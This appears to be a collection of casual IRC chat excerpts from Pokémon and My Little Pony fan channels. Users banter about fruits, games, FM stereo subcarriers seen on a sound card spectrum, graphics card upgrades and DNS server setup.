<RedDragonX> besides I'm too busy watching our dumbass president humiliate himself
<Stormy> Heh
<Stormy> what did he do now?
<RedDragonX> nothing major
<NightSeas> 12Wb
<RedDragonX> cept of course being overseas pandering to appearances when he should be back here taking care of the recent devestation in the mid west
<Skylands> 10Thanks
<RedDragonX> that fuck up with english royalty was especially humerous for me though
<NightSeas> 12As you can see, haii is at it again XD
<Stormy> I didn't hear about that one
<RedDragonX> this country is already fucked up enough and he just adds more to the pile
<NightSeas> 12I had to go on a trip for a few days after the Cbox was added. Has Haii been doing this everyday?
<Skylands> 10I think this is her first day back
<NightSeas> 12Oh, so she has in a way
<NightSeas> 12Anyway, bbl
<RedDragonX> yeah this guy seems to be obsessed with the word "mark" for some reason
<RedDragonX> but he's posting from multipe IP's
<Stormy> It's kind of annoying that you can't tell what IP someone registered from
<Stormy> you can only see their IP after they post
<Stormy> So we can't just ban all the IPs the accounts are from
<RedDragonX> yeah
<Espeon> 06She seems to be unable to understand the concept of... well, that people aren't constantly watching the cbox.

<Kosoveon> that are so cold it turns things floofy
<Kosoveon> don't question the logic
<Pattyrick> No, if it's -50K, it unfloofs them
<Kosoveon> or you will be floofed
<Pattyrick> it turns them into trools
<Espeon> 06how can temperatures under absolute zero make anything fluffy
*Kosoveon floofies Espeon
<Espeon> 06It would just make stuff really really hard because nothing would be able to move at all
<Espeon> 06silly
<Pattyrick> It's not temperatures, it's exposure rates
<Kosoveon> *floofifies
<Espeon> 06ALRIGHT
<Kosoveon> O_O
*Pattyrick suddenly realizes that sounded freaked up
<NightSeas> 12·_·
<Angel_Espeon> 13When you say stuff is made really really hard
<Angel_Espeon> 13...
<Pattyrick> it sounds really really weird
<Pattyrick> here, let's forget that
<Kosoveon> well my psuedo sciences says that theses rays will make you infinitely more floofy than before so there :B

<Espeon> 06Hm

<Rurik> 4Promised friend I'd play Portal 2
<prince-dari> Ah right.
<Angel_Espeon> 13Random Question Time!
<Mikey> ok forgive me for asking but
<Angel_Espeon> 13If your best friend turned into a sheep, would you shear him/her?
<Mikey> WHAT IS PORTAL 2 no one ever shuts up about it ever and I have no fucking clue what it is
<Mikey> I mean I know it's a game
<Mikey> but what makes it different from any other game
<Kosoveon> if they owed me money, yes
<Kosoveon> then I can use their wool to make a sweater as payment :B
<Espeon> 06AE LOL
<Espeon> 06More like
<Espeon> 06RANDOM Question Time
<ChaoMagma> 4hi hi
<Kosoveon> hi chao
<ChaoMagma> 4:)
<prince-dari> There aren't really any other games like it.
<ChaoMagma> 4*glomps*
*Kosoveon is glomped o3o
<prince-dari> I don't think anyway.
<Mikey> okay well what I mean is what's it even about
<Kosoveon> my turn, then:
<ChaoMagma> 4*sigh* sadly, i never could get my umbreon
<ChaoMagma> 4oh well
<Kosoveon> If you had to live the rest of your life as a fruit, what would it be?
<prince-dari> I've not played it. All I know is you have portal guns - you shoot two portal ten you go in on and come out of the other.
<ChaoMagma> 4hmmmmmmmm
<Nick> a poisonous berry
<Angel_Espeon> 13Strawberry~~
<Nick> the most poisonous on earth so noone could eat you
<Pattyrick> I prefer cherries
<ChaoMagma> 4Apple
<Kosoveon> Lime here~
<Pattyrick> Apple, and apples
<ChaoMagma> 4so someone will eat me and i will be useful
<Angel_Espeon> 13FRUITSONAS :D
<Espeon> 06A Kiwi. Because it has "fur". But more seriously though, probably an apple :P
<prince-dari> Although most poeple know about things that it spawns like "The cake is a lie".
<Espeon> 06aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
<Kosoveon> o-o
<Kosoveon> well played.
<Espeon> 06KIWI IS MY SPIRIT-...FRUIT?
<Pattyrick> Rest of my life.... lemon
<ChaoMagma> 4lol
<ChaoMagma> 4Pattyrick is sour XD
<Kosoveon> I AM A LIME AND PROUD OF IT >:3
<Espeon> 06find a few others and have a par- no I won't
<Pattyrick> I love lemons! I don't care if they make me pucker and cringe, they're sooooo goood :P
<Angel_Espeon> 13LOL
<Espeon> 06I prefer lime over lemon but
<Espeon> 06Both are okay
<Kosoveon> ;3
<Kosoveon> my favorite fruit would probably be the peach
<Kosoveon> because I loooove canned peaches <3
<Kosoveon> bananas would be a close second
<Pattyrick> Aww, time for bed D=
<Pattyrick> Goodnight er'body!
*Espeon yawn
<Kosoveon> but I'll stick with limes because they are good to have with certain foods
<Kosoveon> night patty
<Angel_Espeon> 13I think rocks have boring lives
<Angel_Espeon> 13especially because they don't live to begin with
<Manlyguy> My IQ has dropped significally in the last twenty minutes.
<Manlyguy> Thanks, guys.
<Angel_Espeon> 13they just sit thereon their non-existant ass watching the world go by for years with their non-existant eyes
<Angel_Espeon> 13if they're lucky, someone will come along, pick them up and throw them
<ChaoMagma> 4what happned?
<Micro_Nick> so many eons o_o
<Angel_Espeon> 13and for that brief period of time, they will feel "happy" with their non-existant emotions
<Micro_Nick> eons everywhere! *does a toy story meme stance*
<Angel_Espeon> 13but that is so rare
<Kosoveon> if I was quartz I wouldn't mind
<Angel_Espeon> 13so instead they sit there and wait patiently in the hopes that someone will throw them
<Kosoveon> because at least people would look at me admiringly from time to time
<Angel_Espeon> 13because that's the only feeling of non-existant happiness they'll ever feel
<Angel_Espeon> 13because they are otherwise ignored by the rest of the world
<Angel_Espeon> 13and they can't do anything about it
<Espeon> 06>be a stone
<Angel_Espeon> 13because they're rocks
<Espeon> 06>use millions of years to reach the beach
<Angel_Espeon> 13Rock Pity
<Angel_Espeon> 13;-;
<Espeon> 06>some kid THROWS you back into the water
<prince-dari> MLP FIM holy grail?
<Espeon> 06>cry
<Espeon> 06But mostly
<Espeon> 06yawn
<Angel_Espeon> 13LOL
<Angel_Espeon> 13but maybe that's a part of their happiness
<Angel_Espeon> 13the excitement of washing up onto a beach and waiting for someone to throw them
<Angel_Espeon> 13its like going down a slide
<Angel_Espeon> 13you climb to the top, then slide down
<Angel_Espeon> 13it makes you happy
<Angel_Espeon> 13because if no one picks you up and throws you, you're doomed to sit there on the shore doing nothing, because you're a rock and are incapable of doing anything yourself
<Angel_Espeon> 13it makes sense :D
<Espeon> 06a slide
<Espeon> 06taking years to "climb"
<Espeon> 06and seconds to slide down
<Espeon> 06NOT A GOOD INVESTMENT
<Angel_Espeon> 13But the enjoyment of sliding down is worth the wait :D
<Angel_Espeon> 13because it's all they "live" for
<Angel_Espeon> 13since they can't do anything else
<Angel_Espeon> 13;-;

<Kosoveon> rocks don't deserve pity
<Kosoveon> strings do
<Kosoveon> the ones from string theory
<prince-dari> String theory sucks.
<Kosoveon> think of it this way: every atom according to that theory is made of billions of trillions of vibrating strings
<Kosoveon> if you were one of those strings, what would happen to your self esteem?
<Kosoveon> :<
<Angel_Espeon> 13String theory is mentioned in an anime I recently watched LOL
<Umbreon> 12:<
<Angel_Espeon> 13if I remember correctly, she went on about how the universe was created because someone swung a string really fast or something
<Angel_Espeon> 13|D
<Kosoveon> wait what o-o
<prince-dari> Bronies get mentioned in an official Hasbro MLP advert and they used the fan name for a pony. :o
<Angel_Espeon> 13LOL it's k Kosoveon, it's not supposed to make sense |D
<Angel_Espeon> 13Despite being a self-proclaimed genius, she obviously had no idea what she was talking about LOL

<VideoG2> Heya!
<RedJolteon> :3
<VideoG2> What's up?
<prince-dari> Not much here, how about you?
<RedJolteon> I finally got all of my team members on White version to Lv. 100 X3
<VideoG2> Just saw the link to the Brony movie night in the Daily Oat, and I thought I'd check it out.
<VideoG2> Seems I missed it though.
<prince-dari> Yeah, it was yesterday.
<VideoG2> Ah darn.
<VideoG2> What're you doing here then?
<RedJolteon> And I found a Shiny Tropius yesterday.
<prince-dari> I'll just leave myself in here till next week. (:
<VideoG2> xD
<prince-dari> I'm not actually sure whether it's happening or not next week though, NewDCD (the streamer) has an exam, so I don't think he can do it.
<prince-dari> Maybe someone else is picking it up for him.
<Espeon> 06Heya =o
<VideoG2> Ah, I hope so!
<RedJolteon> Hey :3
<VideoG2> I'm sad that I managed to miss Monty Python today. XP
*Angel_Espeon still hasn't levelled a single Pokemon to lv 100 before
<RedJolteon> I've leveled up my Empoleon to Lv. 100 in Pearl,
<prince-dari> Yeah, I missed half of it.
<RedJolteon> But that was forever ago.
<prince-dari> They started two hours earlier this time.
<VideoG2> Ah
<RedJolteon> I'm suprised I managed to do that with the moveset he had X3
<RedJolteon> Hey :3
<prince-dari> Hey Jack_brony.
<Nick> hi RJ!
<RedJolteon> :3
<prince-dari> Wow, a whole 3 of us in here now. :P
<Jack_brony> what is this?
<Jack_brony> and who be ye?
<Angel_Espeon> 13The highest I've ever levelled a Pokemon is lv 80 I think, and that's my team in HeartGold |D
<prince-dari> This is the channel for brony movie night.
<prince-dari> Which was yesterday.
<prince-dari> I'm still just lurking in here from then. :)
<Jack_brony> of this i am aware.
<Jack_brony> why are you still here for so long?
<RedJolteon> I only managed to get a Pokemon to Lv. 62 in SoulSilver XP
<SilverSonic> RJ! *glomps*
<prince-dari> Why not? I can talk to people when they join. :o
<RedJolteon> X3
<Angel_Espeon> 13and tbh I need to breed and retrain most of them because I feel the need to EV train them properly LOL
*RedJolteon is glomped
<Jack_brony> but being here for so long. sounds unhealthy, really.
*RedJolteon doesn't pay much attention to EV training.
<prince-dari> Well I don't actually have to be at the computer to be in here.
<prince-dari> And I can see when people join, I don't have to watch the window to check.
<Jack_brony> right.
*Ray is back from the idle world
<Jack_brony> aaaaaaanyway, i'ma go and watch weeds.
<RedJolteon> X3
<Jack_brony> but first,
<Espeon> 06:3
<Angel_Espeon> 13I'm not really into competitive battling, I just EV train because it makes me happy to see the results of my hard work :3
<RedJolteon> Eh, my Absol
<Jack_brony> what is your favorite mlp episode?
<RedJolteon> Oops,
*Angel_Espeon pokes Ray
<prince-dari> Hmm. I've never really thought about it, I loved the whole series to much. :o
<Angel_Espeon> 13o3o
<RedJolteon> My Absol's attack is above 300 already XP

<Ray> 02:3c
*Angel_Espeon tosses a pizza crust at someone's head

<Angel_Espeon> 13and yes, easy modo
<Angel_Espeon> 13I suck at anything else beyond that LOL
<RedJolteon> What game are you talking about, Espy?

<Okan> 02That sounds interesting
<RedJolteon> I have a fakemon,
*Quanyails 7contemplates over a name for it.
<Angel_Espeon> 13I once made a pre-evo of Skarmory called Skymory
<Quanyails> 7Foulpea, second thought is.

<RedJolteon> My fakemon is Poison/Normal type.
<Quanyails> 7But my friend's internet handle is Skymory. :P
<Drake> 04My kick@$$ fakemon is Dark.
<Quanyails> 7And Poison/Normal. Curious, RJ.
<Drake> 04'cause I'm original like that.

<Okan> 02You know no ninja until you've seen Nargacuga
<Drake> 04But I have seen it.
*Quanyails 7sends an Accelgor to Archogall (did I spell that right? o3o)
<Okan> 02Then you have not learned the ninja ways, go back and resee it
<prince-dari> Oh, good.
*RedJolteon tosses out a Ninjask
<Neon> He basically said "I know nothing abour IRC, do what you want."
*Drake makes Archogall squish Accelgor.
<Neon> And that he'd promote it, which is a plus.
<Drake> 04Yes I have.
<prince-dari> Haha.
<Drake> 04I have learnt it.
<Drake> 04I have mastered it.

<prince-dari> You have a key on your mouse?
<prince-dari> Woah. I want one.
<Craiglol> 03I'm a lazy ass and can't be bothered to draw anything at this time due to my tiredness
<prince-dari> :P
<Drake> 04Ok fair enough XD
<Craiglol> 03Oh I know a way to keep myself entertained
<Craiglol> 03I hope everyone here actually has a TST account?
<prince-dari> I don't think I've ever posted on it.
<Craiglol> 03Huh
<Drake> 04XD
<Craiglol> 03Basically
<prince-dari> I tend to prefer IRC to forums.
*RedJolteon has one but she's somewhat inactive.
<Craiglol> 03I'll leave a comment on anyone's profiles right now if they just say so
<Drake> 04sure
<Craiglol> 03I like leaving comments

<prince-dari> You saw the extended Equestria Girls video?
<Quanyails> 7Sounds too much like Vileplume. X.x
<Craiglol> 03I'll hop over into a PC since I'm sure a pokemon chat would not like some pony discussion :P
<Craiglol> 03HELL YES DID I SEE IT
<Craiglol> 03My mind = blown
<prince-dari> /notice Craiglol That got me so excited. XD Made my day.
<Drake> 04I really don't mind

<Craiglol> 03How long have you been a brony?
<prince-dari> /notice Craiglol Actually only about 2-3 weeks, but I've watched all the episodes twice or more. XD
<Craiglol> 03LOL about the same as me then

<Craiglol> 03And the one time I do I meet someone I haven't met before who just so happens to like teh ponehs
<Craiglol> 03LOL
<Craiglol> 03Judging from the "It's 1:33 here too" and the spelling "mum"
<Craiglol> 03:D
<Craiglol> 03I'm getting happier by the second
<Craiglol> 03England? Scotland? Wales?

<Angel_Espeon> 13Does anyone here know how good/bad Firefox 4 is?
<Craiglol> 03Ah
<Craiglol> 03It's just I met a brony in omegle who also lurks Ponychan
<Craiglol> 03Just asking in the off-chance that it might be you
<Craiglol> 03That would complete my day
*Aristeo sits next to Kitten
<Okan> 02No, I have yet to get it lol
<Quanyails> 7I got it. o3o
<Craiglol> 03I use Chrome because firefox gives me viruses and IE sucks
<Okan> 02I keep telling firefox I'd download it later
<Quanyails> 7From a non-technical standpoint, it's different in appearance, but rather optimized as well.
<Craiglol> 03:P

<Angel_Espeon> 13so every now and then I have to restart firefox to get it to go back to normal
<Angel_Espeon> 13dunno what's causing it though
<Craiglol> 03I was the third poster in. Go me.
<Craiglol> 03Ah. Uh... I may have left after Monty Python
<Craiglol> 03http://www.ponychan.net/chan/oat/res/25565581.html

<Quanyails> 7And name it?
<Sneas> 03yeah
*Sneas will look
<Armageddon> do you have it still? if not I'll just reinstall anope and just make the temp services
<Armageddon> I'll check if I have a backup
<Sneas> 03I don't think I do .-.
<prince-dari> No services - party.
<Armageddon> don't think I do either

<MajinMew> http://www.explosm.net/comics/1112/
<prince-dari> Hahahaha.
<nickstr> for drf bashing AM broadcasting he is forgetting a key fact
<nickstr> FM STEREO IS CARRIED ON AN AM SUBCARRIER!
<junh1024-XD> and FM, when decoding uses a sortove AM decoding ?
<nickstr> for the regular plain old mono FM it is true frequency modulation
<nickstr> AM noise is rejected
<nickstr> the multiplex information for FM stereo is carried on an ultrasonic surpressed carrier double side band AM subcarrier
<junh1024-XD> FM > hy: FM:AM > slope detector
<nickstr> because it does not need much bandwidth
<nickstr> or frequency discriminator
<prince-dari> I love this picture. XD
<prince-dari> http://i188.photobucket.com/albums/z204/prince-dari/129908301826.jpg
<nickstr> in theory these should appear on an audio spectrum analyzer on a computer with a 24 bit soundcard sampling at 192 KHz
<junh1024-XD> oh?
<nickstr> maybe so
<nickstr> do you have a regular mono FM receiver and a sound card capable of 24 bit 192 KHz recording?
<junh1024-XD> well, keep in mind, you can only see frequencies up to 96khz if you do a fft analysis
<junh1024-XD> my stereo system can receive FM
<nickstr> the FM stereo subcarrier is around 57 KHz
<RedDragonX> well you know what
<RedDragonX> then he's boring to
<junh1024-XD> my soundcard claims to do 24b: 192khz
<Stormy> Lol, I'll pass that on for you :P
<RedDragonX> go for it
<junh1024-XD> but i herd realtek ones have a mediocre or bad snr
<RedDragonX> :P
<junh1024-XD> (on board sound btw)
<nickstr> that might be a problem
<nickstr> if it claims 24 bit 192 KHz and is cheap it might be upsampling from 16 bit 48 KHz
<nickstr> HD RADIO FAIL
<nickstr> WFMS 95.5 has their audio severely out of sync
*Quilava rolls
<prince-dari> Rolls...What?
<Presea> D-20
<prince-dari> You are today's big winrar.
<prince-dari> Claim your prize.
<Presea> SA
<junh1024-XD> out of sync?
<junh1024-XD> well, when i record blanks, i see reflections beyond 24k, that may be either upscaling or aliasing, and some peaks from my soundcard
<nickstr> perhaps
<junh1024-XD> when i record my stereo, i get some peaks, mb from the stereo or FM
<nickstr> have you taken a screen shot of it?
<junh1024-XD> i'll do it now
<junh1024-XD> http://imgur.com/a/uC0BF
<nickstr> looks like noise products to me
<nickstr> that does not contain the signature of an FM stereo subcarrier
<junh1024-XD> 18k, fm carrier?
<nickstr> 19 KHz is the pilot tone
<junh1024-XD> yea, i can see that in the second pix
<nickstr> just as I suspected earlier
<nickstr> wait a minute
<nickstr> I SEE IT!
<nickstr> look around 35 KHz
<junh1024-XD> the first screenshot is blank noise
<nickstr> the FM stereo subcarrier is 38 KHz which is the second harmonic of the pilot tone
<junh1024-XD> http://i.imgur.com/J5wkl.png @ 37, that might be a speech harmonic ?
<nickstr> nope
<nickstr> that is the signature for the FM stereo subcarrier
<nickstr> also, do you see that second one at 57 KHz?
<junh1024-XD> eh, well, i made a second recording, it goes up and down @ 38
<junh1024-XD> not much at 57
<junh1024-XD> goes up & down with music
<nickstr> 57 KHz is the RDS subcarrier!
<nickstr> you captured both
<nickstr> congratulations
<nickstr> theory confirmed!
<nickstr> that is the third harmonic to the FM stereo pilot tone
<junh1024-XD> in dis new shot, i can't see 19. but i see a dip at 15
<nickstr> same or different FM station
<junh1024-XD> same
<nickstr> interesting
<nickstr> the first one showed the signature for the FM stereo subcarrier, pilot tone, and RDS subcarrier
<junh1024-XD> yeaa, i think it's a fluke
<nickstr> might be
<nickstr> but they passed compared to what I saw on waveform analysis when I was running an FM station with software on a PC
<nickstr> so maybe that was a valid capture
<nickstr> you never know
<junh1024-XD> oh, if you compare the 2 captures on http://imgur.com/a/uC0BF, 1 is blank noise and 2 is FM audio, the peaks are at almost the same places
<nickstr> this is encouraging
<nickstr> I looked at the differences and maybe there is some truth
<nickstr> but a test with a better sound card is needed
<junh1024-XD> i.e, blank noise without my FM stereo connected.
<nickstr> yep
<junh1024-XD> it seems the random peaks change from recording to recording, since i did one earlier
<nickstr> that is quite a high noise floor
<junh1024-XD> yea, mb a sucky soundcard & a sucky power system
<nickstr> what is interesting is the signature passes
<nickstr> visually I can't tell
<junh1024-XD> 'it just happens to. by coincidence.
<nickstr> they look IDENTICAL to the carriers I am looking for
<nickstr> so it is quite a coincidence
<junh1024-XD> yes.
<nickstr> does your tuner have RDS as well?
<junh1024-XD> what
<nickstr> the logo looks like a sideways figure 8 with RDS next to it
<nickstr> its about the easiest way to tell
<junh1024-XD> it's just a normal hi-fi from a Sony consumer store store
<junh1024-XD> nah
<junh1024-XD> has a tape & cd player too
<nickstr> might not be your tuner then
<nickstr> the sound card is highly suspect
<junh1024-XD> everything's highly suspect.
<nickstr> the sound card most of all
<junh1024-XD> my audio cable's like, 15ft long, and the power supply, too
<drfsupercenter> 03hm
<drfsupercenter> 03anyone know where I might find 3mm P1 Phillips screws?
<drfsupercenter> 03they're the kind mini-PCI express cards use
<drfsupercenter> 03I need a few
<junh1024-XD> radioshack?
<nickstr> the long audio cable is the most suspicious
<nickstr> ideally you would use one shielded for RFI
<nickstr> and EMI
<junh1024-XD> it runs right next to my TV cable, too
*junh1024-XD hides
<junh1024-XD> and a few other USB, etc, cables
<nickstr> USB cables I am not worried about
<junh1024-XD> WFMS 95.5 has their audio severely out of sync < what do you mean?
<nickstr> IBOC digital audo to analog FM audio
<drfsupercenter> 03well I'm gonna shutdown for a bit
<nickstr> they have to match up due to the digital receivers blending to digital from analog
<junh1024-XD> so the digital stream is behind the analog stream?
<nickstr> yes
<nickstr> due to the encoding process
<nickstr> the analog signal is traditional FM stereo

<Quanyails> 7Now you'd have to figure out if that 'd meant did or would. o3o
<Quanyails> 7And on another note, my sprite is done, but I still haven't confirmed a name for the fakemon.
<Quanyails> 7How does Peyevil sound?
<Micro_Nick> "Aaron Hobbs is a freelance writer based in Sydney, Australia. He's fluent in several languages, including Australian, American and English."
<Micro_Nick> uuh...I don't know whether to laugh hard or be genuinely confused at that
<Quanyails> 7O_o
<Quanyails> 7Well, differences in their vocabulary?
<Micro_Nick> the fact 'english' comes last after australian and american makes me go wtf
<Quanyails> 7English English, Nick.
<Quanyails> 7As in, from England.
<Micro_Nick> lol difference in spelling does not warrant a totally different language
<Quanyails> 7It's more of the slang here and there.
<Quanyails> 7E.g, "robot" in South-African English refers to a traffic light.
<Micro_Nick> slang and slight differntiation in spelling yes, but the universal language does not mean people speak 'american' or australian compared to english as the words are said the same
<Micro_Nick> the fact the guy posted that at the end of the article as if he can speak different languages because he knows how the americans or austrlians spell it differently from england as if its an achivement makes me face palm
<Quanyails> 7Hmm.
<Quanyails> 7So he is commenting on the differences in writing...
<Micro_Nick> its not like speaking english, german, french, russian is important anymore, as long as you know how english speaking countries spell english words different is ok xD

<Ray||Homeworkz> 02So you have time
<Kosoveon> I think it's fake
<Kosoveon> but I've been wrong before :P
<Micro_Nick> I heard its just a spoof to get final fantasy 7 fans pumped since strife is the surname of cloud
<Kosoveon> and ray, I'm thinking about getting it within the next couple months
<Kosoveon> I'm saving for it now
<Micro_Nick> and he's CONSTANTLY requested as a smash character :\
<Kosoveon> I think that's just because "strife" is a synonym for "brawl"
<Ray||Homeworkz> 02Kosovo
<Micro_Nick> and megaman :\
<Ray||Homeworkz> 02Here take the easy path, sell something for a lot of money
<Ray||Homeworkz> 02Then profit
<Kosoveon> Problem
<Kosoveon> I got nothing I can or want to sell D:
<Kosoveon> I got a bunch of old stuff, and a 360
<Micro_Nick> if ANY capcom character should be in a new smash as a guest it should be Ryu. You can see the SF influence in smash in the opening cinematic in the original Smash where Kirby faces down mario all SF animated movie style
<Kosoveon> which I am NOT selling because I want to play bioshock infinite
<Ray||Homeworkz> 02Sell the 360 and th-- FUUU

<drfsupercenter> 03EW NEW WII BUNDLES
<Kosoveon> but...I still gotta get brawl too >_>
<drfsupercenter> 03for several reasons
<drfsupercenter> 031. New Wiis can't be hacked, and EW WIIS THAT AREN'T HACKED
<drfsupercenter> 032. WTF paying $20 for Wii sports?
<prince-dari> "Can't be hacked" LOL
<prince-dari> Funny.
<drfsupercenter> 03well
<drfsupercenter> 03you can do software hacking
<drfsupercenter> 03but from what I've read, it will refuse to read any sort of DVD+R disc
<drfsupercenter> 03if you try to use a software loader
<drfsupercenter> 03I have a first-run Wii and I put a WiiKey on that thing, even now I can just burn the ISO, pop it in the Wii, good as new
<drfsupercenter> 03I mean
<drfsupercenter> 03hacking aside
<drfsupercenter> 03having a $150 bundle that comes with Wii Sports + Wii Sports Resort and then buying MKWii for what, $30 or so? is a better deal than getting MKWii with it and buying Wii Sports ($20) and Wii Sports Resort ($50) separately
<HyperMetalLugia> o.o
<prince-dari> Wii sports costs money? O_o
<prince-dari> I thought it was free, or it was when I got a wii ages ago.
<drfsupercenter> 03Yes it does
<drfsupercenter> 03because of the crappy new Wii bundle that comes with Mario Kart, they're now selling Wii Sports for $20.
<drfsupercenter> 03hence
<drfsupercenter> 03> EW NEW WII BUNDLES
<prince-dari> That's weird.
<drfsupercenter> 03also LOL GAMESTOP
<drfsupercenter> 03Just go get a Wii on ebay for like $70

<Quanyails> 7See you in a sec.
<Altair> on a vista as os? o.o
<HyperMetalLugia> kay
<Altair> there isn't really a preferred resolution of windows, it's based off your hardware specs
<Soyuz> Windows Vista, 64 bit
<Soyuz> well I don't know that D:<
<Altair> and yes again, lower resolutions = more FPS
<Altair> less data to render
<Altair> usually you don't notice it unless it's a super-intensive game or you have an older graphics card

<Soyuz> most mods I placed before that did not lag, overhaul caused it perhaps
<prince-dari> Well if it makes the game more graphically intensive then yeah.
<Soyuz> hmm..
<Soyuz> Dos anti-aliasing have any determination in this?
<prince-dari> Yeah.

<prince-dari> What kind of graphics card have you got?
<Soyuz> I have no idea
<Soyuz> computer is maybe 2-3 years old
<Soyuz> but, I have no idea what my graphics card is
<Soyuz> nor how to find out
<prince-dari> If it's just the one that came with the compute it's probably not very good.
<prince-dari> computer*
<Soyuz> how do I find out?
<Soyuz> and how can I replace it with an awesome but cheap one
<prince-dari> How much would you be willing to spend on one?

<Soyuz> is number 1 or 5 the best?
<prince-dari> One.
<Soyuz> and 210 pounds equates to what in American dollars?
<Soyuz> appearantly just some 250 dollars
<prince-dari> 210 = 346 dollars.

<Soyuz> hell its 269 in Dallas
<prince-dari> Well maybe they have the prices wrong on that site then.
<prince-dari> Because £210 = $346
<prince-dari> I don't know what to say.

<Soyuz> UGLY
<Soyuz> prince-dari; it has a "100312-1GSR" prior to its name
<Soyuz> though how does this look? http://www.google.com/products/catalog?q=AMD+Radeon+HD+6950&oe=utf-8&rls=org.mozilla:en-US:official&client=firefox-a&um=1&ie=UTF-8&tbm=shop&cid=11344147097762301192&sa=X&ei=GeDiTeXVBYjY0QG6yPG-Bw&ved=0CEoQ8gIwAg
<prince-dari> I think the one they're talking about is 2GB.
<Soyuz> :|
<prince-dari> But I don't see any that look exactly like the one picture on the site.

<Soyuz> so either the one I linked is the 1GB
<MTChar> cheshire cat
<Shiny-Growlithe> 02Eh?
<Soyuz> or something is wrong with the images
<Soyuz> prince-dari; though the main reason of the lag (which isn't that bad if you consider that it still runs) could be mainly due to the graphics card shitting that something approached it that can not be all overcome?
<prince-dari> I don't follow what you are saying.
<Soyuz> That the graphics card is causing the lag, because the graphics in-game are too much for it
<drf|laptop> 03LOL
<drf|laptop> 03Quanyails, i found sometihng weird earlier too
<drf|laptop> 03I found the same username twice.
<drf|laptop> 03in the same map.
<prince-dari> That's kind of the whole point of getting a better graphics card, so it can render the game on your screen faster and in higher detail.
<Quanyails> 7o.o
<Soyuz> well so far, I didn't need one
<Quanyails> 7Weird indeed.
<Soyuz> even for games like Dragon Age Origins
<Soyuz> which my computer maintained a good FPS of...30-50
<Quanyails> 7And sorry, Shiny, if the fakemon went on a completely different design than I expected.
<prince-dari> I don't know, if you don't want to get a new graphics card, don't, just use less intensive settings.

<Emmi> Aristeo: ...do you know her personally? O.o
<Aristeo> no :(
<Aristeo> Not yet
<Aristeo> :3
<Emmi> Aristeo: Hey ! I'm Christina Grimmie ! I'm 17, i'm obsessed with Zelda. Im a Christian, love Jesus Christ, He's my Lord & Savior, i also love mario and pretty much im just a videogame geek. I love to sing, write music, and i never take a ride in a car without my ipod. Ever. mario and zelda are amazing and i probly know EVERYTHING about Zelda: Ocarina of Time. :D
<Emmi> Errrrr
<Emmi> 1. she's 17 2. i thought you were tired of uber-religious people :P
<Aristeo> Yeah :(
<Aristeo> oh well
<Charles> lol, uber religious folk are fun to toy with, not quite dating material though
<Chimera> 04huh
<Chimera> 04This flash is looking pretty good :3
<prince-dari> I don't see how she counts as 'uber-religious' she just mentions in a sentence that she's a Christian, she's not posting all over the internet "CONVERT!".
<Charles> "Im a Christian, love Jesus Christ, He's my Lord & Savior,"
<Charles> they typically CAN'T leave it at just that
<prince-dari> But she did.
<prince-dari> So...
<Charles> no, thats just the footnote
<Charles> trust me
<prince-dari> I don't like religion being shoved down my throat, but criticising someone just for saying they're Christian seems too harsh.
<Aristeo> I think you're missing the point
<Charles> a typically religious person will say they are Christian
<Aristeo> Look at how pretty she is :O
<Aristeo> I love having sushi shoved down my throat though
<Aristeo> omg loveeeeeeeeeee sushi <3333333
<Charles> an uber religious person typically uses the words: Jesus Christ and Lord and Saviour
<prince-dari> As a Christian your religion is based around those things, so why wouldn't they use those words?
<Charles> because a religious person will assume you at least know that Jesus is the focal point of their religion
<Charles> well, Jesus and God...and a ghost
<Charles> :/
<Emmi> Aristeo: The point is that she's *probably* totally brainwashed and if so, she'll probably try to shove her beliefs up your ass too
<Aristeo> nooooooooo
<Emmi> sorry
<Aristeo> The point is just look at how well she sings :3
*Emmi facepalms
<Aristeo> Her voice makes my ears feel good D:
*Charles suggests an intervention
<Aristeo> Okies
*Aristeo takes Emmi <3
*Aristeo gives the girl to prince-dari
<prince-dari> Hahaha.
*Aristeo places Jason next to Charles
<Emmi> When she argues with you daily over religion, Aristeo, her voice wil not make your ears feel good.
<Charles> geee, thanks
<Emmi> :3
<prince-dari> My mum's a Christian, my dad dislikes all religion, they've had no problems.
<Emmi> .....Aaanyway, I don't think we're supposed to be talking about religion in here
<Emmi> amirite
<Charles> sorta
<prince-dari> :o
<Charles> I am fairly certain we all trust each other not to grasp at each others throats
<Emmi> alright

<Spyrorocks> Aristeo, can you host a bind dns server using only one IP?
<Spyrorocks> so ns1 and ns2 are both the same ip
<Aristeo> It's possible, but anytime I've ever tried to do that, the service has been shakey
<prince-dari> I'm pretty sure I've seen tutorials for setting up master/slave server on Bind.
<Spyrorocks> Aristeo, thats odd
<Spyrorocks> theoretically it should work
<Aristeo> Actually we tried that a couple years back
<Spyrorocks> what if its 2 IPs hosted by the same server
<Aristeo> I think what happens is if the DNS gets no reply, it proprogates that lack of reply or something, I don't know
<Spyrorocks> what if its 2 IPs hosted by the same server?
<Aristeo> I don't see how that would make any difference

<Ascendant> It's not the joke that's typically bad. It's the fact you actually tried to troll me.
<Ascendant> ;p
<prince-dari> What a let down. I had my popcorn all ready for the drama.

<Ascendant> lolwut?
<Ascendant> and lmfao Drake
<Ascendant> also Drake
<NightSeas> 12Well, sorry Ascendant if it upset you that bad
<Ascendant> today I was like "GO PLAY CHESS WITH ME" at Hensh
<Ascendant> and he was like "nah, go play some real games like world of warcraft"
<Ascendant> and NightSeas if you couldn't tell, I was kidding
<Drake> 04LOL
<Ascendant> but then he was like "maybe, but you'll probably win"
<Ascendant> lmfao
<NightSeas> 12I know, but just in case ponies really upset you XD
<Drake> 04You
<Drake> 04beat the Hensh
<Drake> 04lol
<Ascendant> ...do you have to take me seriously?
<Ascendant> lmfao Drake
<Ascendant> he's a pretty cool guy eh doesn't afraid of anything
<prince-dari> Except chess.
<Drake> 04lol
<Ascendant> lol
<NightSeas> 12But really NS, have you seen one episode of MLP?
<Ascendant> yes
<Ascendant> actually I've seen like...5
<NightSeas> 12rofl
<Ascendant> we were watching it at my friend's house at her party
<Ascendant> :X
<Ascendant> ohai junh1024-X2
<junh1024-X2> ih
<prince-dari> [09:48] <Ascendant> lolwut? I wrote out all the names of pretty much every character from MLP and coloured them by their hair, and body colour. Sometimes eyes and other stuff they were too.
<prince-dari> And the bot spams all of them.
<prince-dari> Well, it just says them once.
<Ascendant> o_O
<NightSeas> 12Well, now your going to be contaminated with pony like the rest of us
<NightSeas> 12You can't watch more then 2 and get away

<Drake> 04OHMYDEARGOD
<prince-dari> PONY KOREA IS BEST KOREA!
<NightSeas> 12[02:54] <%Ascendant> it's boring <-- My thoughts untill I watched a few
